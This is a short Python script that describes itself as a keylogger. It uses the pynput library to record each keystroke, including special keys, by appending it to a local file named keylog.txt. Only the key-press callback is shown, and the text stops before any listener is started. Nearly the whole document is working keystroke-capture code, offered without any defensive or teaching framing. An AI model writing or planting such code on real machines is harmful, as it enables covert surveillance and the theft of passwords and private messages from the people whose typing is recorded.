#!/bin/python3

"""Keylogger script to capture keystrokes and save them to a file. Advanced usage may require additional permissions or libraries."""

import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    """Callback function to handle key press events."""
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Ctrl, Alt, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f" {key} ")  